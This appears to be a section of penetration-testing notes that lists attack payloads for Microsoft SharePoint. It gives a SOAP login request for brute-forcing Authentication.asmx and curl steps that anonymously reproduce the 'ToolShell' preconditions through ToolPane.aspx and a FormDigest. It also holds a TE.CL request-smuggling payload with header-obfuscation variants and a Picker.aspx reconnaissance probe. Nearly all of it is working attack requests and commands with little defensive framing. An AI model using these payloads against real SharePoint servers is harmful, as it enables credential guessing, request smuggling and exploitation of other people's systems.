## Payload & Detection Patterns

**Authentication.asmx Login (the canonical brute-force endpoint):**
```xml
POST /_vti_bin/Authentication.asmx HTTP/1.1
Host: target.example
Content-Type: text/xml; charset=utf-8
SOAPAction: http://schemas.microsoft.com/sharepoint/soap/Login
Content-Length: 376

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Login xmlns="http://schemas.microsoft.com/sharepoint/soap/">
      <username>USERNAME</username>
      <password>PASSWORD</password>
    </Login>
  </soap:Body>
</soap:Envelope>
```
Response codes:
- `<ErrorCode>NoError</ErrorCode>` → auth success; `<CookieName>FedAuth</CookieName>` and `<TimeoutSeconds>...</TimeoutSeconds>` follow
- `<ErrorCode>PasswordNotMatch</ErrorCode>` → auth fail (uniform for non-existent users too — no enum leak via error string)
- 500 + `<faultstring>Value cannot be null. Parameter name: userName</faultstring>` → empty username

**ToolShell precondition reproduction:**
```bash
# Step 1: anon GET ToolPane.aspx
TP=$(curl --max-time 30 --connect-timeout 10 -sk "https://target.example/_layouts/15/ToolPane.aspx?DisplayMode=Edit")
echo "$TP" | grep -oE '__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="[^"]*"'
# If value="" → precondition

# Step 2: anon FormDigest
DIGEST=$(curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.example/_api/contextinfo" \
  -H "Accept: application/json;odata=verbose" \
  | jq -r '.d.GetContextWebInformation.FormDigestValue')
echo "Digest: ${DIGEST:0:40}..."

# Step 3: anon POST ToolPane with digest
curl --max-time 30 --connect-timeout 10 -sk -X POST -H "X-RequestDigest: $DIGEST" \
  --data "MSOSPWebPartManager_DisplayModeName=Browse&MSOTlPn_Button=none" \
  "https://target.example/_layouts/15/ToolPane.aspx?DisplayMode=Edit" \
  -w "\ncode=%{http_code} size=%{size_download}\n"
```

**HTTP TE.CL smuggling on AWS ELB + SP IIS back-end** (consistent on SP farms behind AWS ELB):
```
POST /_layouts/15/blank.htm HTTP/1.1
Host: target.example
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST /404 HTTP/1.1
Host: x
Content-Length: 15

x=1
0

```
Expected back-end hang: ~12 s vs ~0.16 s baseline (consistent across 5 trials). Obfuscation variants (`Transfer-Encoding : chunked`, `transfer-encoding: chunked`, trailing-space, mixed-case) produce a similar ~6 s hang.

**Picker.aspx SafeControl recon:**
```bash
curl --max-time 30 --connect-timeout 10 -sk "https://target.example/_layouts/15/Picker.aspx?PickerDialogType=Microsoft.SharePoint.WebPartPages.DataFormWebPart&typeName=System.String" \
  | grep -oE "<title>[^<]+</title>"
# "Only PickerDialog types..." = exists, not whitelisted
# "Could not load type..."    = does not exist
```

---

